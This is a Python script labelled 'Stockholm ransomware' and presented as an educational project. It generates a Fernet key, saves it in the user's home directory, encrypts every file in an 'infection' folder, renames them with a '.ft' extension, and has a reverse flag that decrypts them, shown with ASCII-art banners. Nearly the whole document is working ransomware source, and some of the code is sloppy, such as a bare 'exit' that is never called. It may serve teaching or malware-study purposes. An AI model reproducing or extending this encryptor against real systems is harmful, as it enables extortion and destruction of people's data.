import os
import argparse
from shutil import ExecError
from tracemalloc import stop
from cryptography.fernet import Fernet
from getpass import getuser
from time import sleep
from tqdm import tqdm

user = getuser()
user_dir = '/home/' + user
default_dir = '/home/' + user + '/infection/'

# List with all files !
ext_list = ()

# Adding all the files that are encrypted by Wannacry to the list
files_wcry = ()

#with open("dictionnary_wcry.txt", "rb") as thedic:
#    files_wcry = thedic.read()

#test = "bonjour.txt"
#last = os.path.splitext(test)[1]


# Flags
parser = argparse.ArgumentParser(
    description="""
    *** STOCKHOLM RANSOMWARE ***
    
    Encrypt and decrypt all files and subdirectories affected by Wannacry.
    It also changes extension of each file.
    *** WARNING: This program was written for educational purposes.
    The responsibility for the use and distribution of the tool lies with the user.
    Use it at your own risk and enjoy! - salecler """
    )
# Version
parser.add_argument('-v', '--version', action='store_true', help='show version of the program.')
# Reverse
parser.add_argument('-r', '--reverse', action='store_true', help="decrypt all the files and subdirectories. Also change back the file's extension.")
# Silent
parser.add_argument('-s', '--silent', action='store_true', help='will silent the program.')

args = parser.parse_args()

# All files present in default_dir
#for element in os.listdir(default_dir):
#    if os.path.isfile(os.path.join(default_dir, element)):
#        ext = os.path.splitext(element)[1]
#        ext_list.append(ext)
try:
    if args.version == True and args.reverse == True:
        err = "You are not allowed to use both flags at the same time."
        print(err)
        exit
    elif args.version == True:
        os.system("clear")
        print("""
    ┏━┳┓╋╋╋╋┏┓┏┓
    ┃━┫┗┳━┳━┫┣┫┗┳━┳┓┏━━┓
    ┣━┃┏┫╋┃━┫━┫┃┃╋┃┗┫┃┃┃
    ┗━┻━┻━┻━┻┻┻┻┻━┻━┻┻┻┛""")   
        print("Version 1.1 - ", "ｓａｌｅｃｌｅｒ")
    elif args.reverse == True:
        os.system("clear")
        print("""
    ╔═╗░░░░░╔═╗╔══════╗░╔════╗░╔═╗░░╔═╗╔═╗░░╔═╗░╔════╗░░╔════╗░░░░╔═╗░░░░╔═════╗ 
    ║██░╔═╗░║██╚███████╔╝█████╗║██░░║██╚██╗░║██╔╝█████╗╔╝█████╗░░░║██░░░╔╝██████ 
    ║██╔╝██╗║██░░░░░║██║██░░║██║██══╝██░╚██═╝██╚██░░║██║██░░║██░░░║██░░░╚██═══╗░ 
    ║██╝████╝██░░░░░║██║██░░║██║███████░╔═█████╔═╗░░║██║██░░║██░░░║██░░░░╚█████╗ 
    ║████░╚████░░░░░║██╚██══╝██║██░░║██╔╝██░║██╚██══╝██╚██══╝██╔══╝██══╗╔════╝██ 
    ╚███░░░╚███░░░░░╚██░╚█████░╚██░░╚██╚██░░╚██░╚█████░░╚█████░╚████████╚██████░""")
        sleep(1)
        os.system("clear")
        print("""
    ██████╗░███████╗░█████╗░██████╗░██╗░░░██╗██████╗░████████╗██╗███╗░░██╗░██████╗░░░░░░░░░░
    ██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██║████╗░██║██╔════╝░░░░░░░░░░
    ██║░░██║█████╗░░██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░██║██╔██╗██║██║░░██╗░░░░░░░░░░
    ██║░░██║██╔══╝░░██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░██║██║╚████║██║░░╚██╗░░░░░░░░░
    ██████╔╝███████╗╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██║██║░╚███║╚██████╔╝██╗██╗██╗
    ╚═════╝░╚══════╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝╚═╝╚═╝""")
        os.chdir(user_dir)
        with open("key", "rb") as thekey:
            secret_key = thekey.read()
        os.chdir(default_dir)
        try:
            for element in os.listdir(default_dir):
                try:
                    base, en_element_ext, last = element.split('.')
                    new_ext = os.path.splitext(en_element_ext)[0]
                
                    with open(element, "rb") as thearchive:
                        en_content = thearchive.read()
                    de_content = Fernet(secret_key).decrypt(en_content)
                    with open(element, "wb") as thearchive:
                        thearchive.write(de_content)
                    reverse_archive = os.path.splitext(element)[-2]
                    if reverse_archive != '.ft' and reverse_archive != '':
                        base = os.path.splitext(element)[0]
                        os.rename(element, base)
                    new_base = os.path.splitext(element)[-1]
                except:
                    print("\n" + element + " could not be decrypted because of his original extension !\n")
        except Exception:
            print("An error has occurred.")
            print("Exiting...\n")
            sleep(0.5)
            exit()
            
        sleep(1)
        seconds = 10
        for i in tqdm(range(seconds)):
            sleep(.300)
        sleep(2)
        os.system("clear")
        print("""
    ███████╗██╗██╗░░░░░███████╗░██████╗  ██╗░░██╗░█████╗░██╗░░░██╗███████╗  ██████╗░███████╗███████╗███╗░░██╗
    ██╔════╝██║██║░░░░░██╔════╝██╔════╝  ██║░░██║██╔══██╗██║░░░██║██╔════╝  ██╔══██╗██╔════╝██╔════╝████╗░██║
    █████╗░░██║██║░░░░░█████╗░░╚█████╗░  ███████║███████║╚██╗░██╔╝█████╗░░  ██████╦╝█████╗░░█████╗░░██╔██╗██║
    ██╔══╝░░██║██║░░░░░██╔══╝░░░╚═══██╗  ██╔══██║██╔══██║░╚████╔╝░██╔══╝░░  ██╔══██╗██╔══╝░░██╔══╝░░██║╚████║
    ██║░░░░░██║███████╗███████╗██████╔╝  ██║░░██║██║░░██║░░╚██╔╝░░███████╗  ██████╦╝███████╗███████╗██║░╚███║
    ╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝  ╚═════╝░╚══════╝╚══════╝╚═╝░░╚══╝

    ░█████╗░░█████╗░██████╗░██████╗░███████╗░█████╗░████████╗██╗░░░░░██╗░░░██╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║░░░░░╚██╗░██╔╝
    ██║░░╚═╝██║░░██║██████╔╝██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██║░░░░░░╚████╔╝░
    ██║░░██╗██║░░██║██╔══██╗██╔══██╗██╔══╝░░██║░░██╗░░░██║░░░██║░░░░░░░╚██╔╝░░
    ╚█████╔╝╚█████╔╝██║░░██║██║░░██║███████╗╚█████╔╝░░░██║░░░███████╗░░░██║░░░
    ░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝░░░╚═╝░░░

    ██████╗░███████╗░█████╗░██████╗░██╗░░░██╗██████╗░████████╗███████╗██████╗░
    ██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
    ██║░░██║█████╗░░██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░█████╗░░██║░░██║
    ██║░░██║██╔══╝░░██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░██╔══╝░░██║░░██║
    ██████╔╝███████╗╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░███████╗██████╔╝
    ╚═════╝░╚══════╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚══════╝╚═════╝░""")
        print("\n\n\n\n\n\nｓａｌｅｃｌｅｒ")
        sleep(2)
        os.system('clear')
            
    # Encrypt the files
    elif args.reverse == False and args.version == False:
            # Create the key
        os.chdir(user_dir)
        key = Fernet.generate_key()
        with open("key", "wb") as thekey:
            thekey.write(key)
        os.chdir(default_dir)
        
        for element in os.listdir(default_dir):
            element_ext = os.path.splitext(element)[-1]
            print(element_ext)
            if element_ext != '.ft' and element_ext != '':
                if args.silent == False:
                    print(element)
                with open(element, "rb") as thefile:
                    content = thefile.read()
                encrypted_content = Fernet(key).encrypt(content)
                with open(element, "wb") as thenewfile:
                    thenewfile.write(encrypted_content)
        for archive in os.listdir(default_dir):
            base_archive = os.path.splitext(archive)[-1]
            if base_archive != '.ft' and base_archive != '':
                os.rename(archive, archive + '.ft')
except Exception:
    print("Something went wrong with the program.\nPlease try again.\n")
